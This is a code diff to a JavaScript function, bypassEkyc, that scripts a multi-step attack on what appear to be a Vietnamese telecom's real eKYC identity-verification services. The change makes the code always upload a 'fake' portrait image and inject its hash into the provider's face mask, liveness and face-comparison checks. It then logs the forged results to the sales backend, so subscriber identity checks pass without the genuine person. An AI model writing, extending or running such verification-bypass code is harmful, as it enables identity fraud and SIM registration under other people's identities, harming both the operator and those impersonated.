@@ -678,12 +678,10 @@ window.bypassEkyc = async function(phone, btnElement, fastMode = false) {
 
         let p_image_hash = '';
         
-        if (fastMode && realImageHash) {
-            p_image_hash = realImageHash;
-            console.log('⚡ [FAST MODE] Bỏ qua upload IDG, sử dụng hash gốc từ điện thoại:', p_image_hash);
-        } else {
-            // 5. Upload anh fake len IDG
-            btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 5/13: Upload anh fake len IDG...';
+        // LUÔN LUÔN Upload ảnh fake (ảnh chân dung của khách hàng) lên IDG để lấy hash mới.
+        // Tuyệt đối KHÔNG dùng realImageHash từ cURL, vì đó là khuôn mặt của NHÂN VIÊN.
+        // 5. Upload anh fake len IDG
+        btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 5/13: Upload anh fake len IDG...';
             for (let addTry = 1; addTry <= 5; addTry++) {
                 const fd = new FormData();
                 fd.append('file', blob, 'portrait_full.jpg');
@@ -712,7 +710,6 @@ window.bypassEkyc = async function(phone, btnElement, fastMode = false) {
                     await new Promise(r => setTimeout(r, 400));
                 }
             }
-        }
         
         console.log('[IDG] Final image hash:', p_image_hash);
 
@@ -728,67 +725,55 @@ window.bypassEkyc = async function(phone, btnElement, fastMode = false) {
 
         let maskData = {}, livenessData = {}, compareData = {};
 
-        if (!fastMode) {
-            // 6. Mask check (IDG AI)
-            btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 6/13: Kiem tra mask (Inject)...';
-            const maskRes = await fetch(`https://api.idg.vnpt.vn/ai/v2/face/mask?challenge_code=${challengeCode}`, {
-                method: 'POST',
-                headers: idgAIHeaders,
-                body: JSON.stringify({ img: p_image_hash, client_session: clientSession, token: bodyToken, step_id: 0 })
-            });
-            maskData = await maskRes.json().catch(() => ({}));
-            console.log('[IDG] mask:', maskRes.status, maskData);
+        // 6. Mask check (IDG AI)
+        btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 6/13: Kiem tra mask (Inject)...';
+        const maskRes = await fetch(`https://api.idg.vnpt.vn/ai/v2/face/mask?challenge_code=${challengeCode}`, {
+            method: 'POST',
+            headers: idgAIHeaders,
+            body: JSON.stringify({ img: p_image_hash, client_session: clientSession, token: bodyToken, step_id: 0 })
+        });
+        maskData = await maskRes.json().catch(() => ({}));
+        console.log('[IDG] mask:', maskRes.status, maskData);
 
-            // 7. Liveness check (IDG AI)
-            btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 7/13: Kiem tra liveness (Inject)...';
-            const livenessRes = await fetch(`https://api.idg.vnpt.vn/ai/v2/face/liveness?challenge_code=${challengeCode}`, {
-                method: 'POST',
-                headers: idgAIHeaders,
-                body: JSON.stringify({ img: p_image_hash, client_session: clientSession, token: bodyToken, step_id: 0 })
-            });
-            livenessData = await livenessRes.json().catch(() => ({}));
-            console.log('[IDG] liveness:', livenessRes.status, livenessData);
+        // 7. Liveness check (IDG AI)
+        btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 7/13: Kiem tra liveness (Inject)...';
+        const livenessRes = await fetch(`https://api.idg.vnpt.vn/ai/v2/face/liveness?challenge_code=${challengeCode}`, {
+            method: 'POST',
+            headers: idgAIHeaders,
+            body: JSON.stringify({ img: p_image_hash, client_session: clientSession, token: bodyToken, step_id: 0 })
+        });
+        livenessData = await livenessRes.json().catch(() => ({}));
+        console.log('[IDG] liveness:', livenessRes.status, livenessData);
 
-            // 8. Compare face (IDG AI)
-            btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 8/13: So sanh khuon mat (Inject)...';
-            const compareRes = await fetch(`https://api.idg.vnpt.vn/ai/v2/face/compare?challenge_code=${challengeCode}`, {
-                method: 'POST',
-                headers: idgAIHeaders,
-                body: JSON.stringify({ img_front: '', step_id: 0, token: bodyToken, img_face: p_image_hash, client_session: clientSession })
-            });
-            compareData = await compareRes.json().catch(() => ({}));
-            console.log('[IDG] compare:', compareRes.status, compareData);
-        } else {
-            console.log('⚡ [FAST MODE] Bỏ qua 3 bước gọi API AI (mask, liveness, compare) vì app thật đã làm việc này.');
-            if (!realClientSession || !realChallengeCode) {
-                console.warn('⚠️ [CẢNH BÁO] Bạn đang dùng Fast Mode nhưng KHÔNG dán mã cURL! Các Session ID được tạo ngẫu nhiên sẽ KHÔNG khớp với app thật, có thể dẫn đến lỗi "Không lấy được ảnh chân dung" ở bước cuối.');
-            }
-        }
+        // 8. Compare face (IDG AI)
+        btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 8/13: So sanh khuon mat (Inject)...';
+        const compareRes = await fetch(`https://api.idg.vnpt.vn/ai/v2/face/compare?challenge_code=${challengeCode}`, {
+            method: 'POST',
+            headers: idgAIHeaders,
+            body: JSON.stringify({ img_front: '', step_id: 0, token: bodyToken, img_face: p_image_hash, client_session: clientSession })
+        });
+        compareData = await compareRes.json().catch(() => ({}));
+        console.log('[IDG] compare:', compareRes.status, compareData);
 
 
+        // 9. Log eKYC ket qua AI len ONEBSS
+        btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 9/13: Ghi log eKYC...';
+        const logEkycPayload = {
+            p_so_tb: phone,
+            p_image_hash: p_image_hash,
+            p_challenge_code: challengeCode,
+            p_client_session: clientSession,
+            menu_id: 810241,
+            p_liveness: JSON.stringify(typeof livenessData !== 'undefined' ? livenessData : {}),
+            p_compare: JSON.stringify(typeof compareData !== 'undefined' ? compareData : {}),
+            p_mask: JSON.stringify(typeof maskData !== 'undefined' ? maskData : {})
+        };
 
-        if (!fastMode) {
-            // 9. Log eKYC ket qua AI len ONEBSS
-            btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 9/13: Ghi log eKYC...';
-            const logEkycPayload = {
-                p_so_tb: phone,
-                p_image_hash: p_image_hash,
-                p_challenge_code: challengeCode,
-                p_client_session: clientSession,
-                menu_id: 810241,
-                p_liveness: JSON.stringify(typeof livenessData !== 'undefined' ? livenessData : {}),
-                p_compare: JSON.stringify(typeof compareData !== 'undefined' ? compareData : {}),
-                p_mask: JSON.stringify(typeof maskData !== 'undefined' ? maskData : {})
-            };
-
-            await fetch('https://api-onebss.vnpt.vn/app-banhang/Ekyc/log_ekyc', {
-                method: 'POST',
-                headers: { ...baseHeaders, 'Content-Type': 'application/json' },
-                body: JSON.stringify(logEkycPayload)
-            }).catch(e => console.warn('[log_ekyc] Loi:', e.message));
-        } else {
-            console.log('⚡ [FAST MODE] Bỏ qua ghi log eKYC vì app thật đã ghi.');
-        }
+        await fetch('https://api-onebss.vnpt.vn/app-banhang/Ekyc/log_ekyc', {
+            method: 'POST',
+            headers: { ...baseHeaders, 'Content-Type': 'application/json' },
+            body: JSON.stringify(logEkycPayload)
+        }).catch(e => console.warn('[log_ekyc] Loi:', e.message));
 
         // 10. Xin link Upload MinIO
         btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 10/13: Xin upload link...';
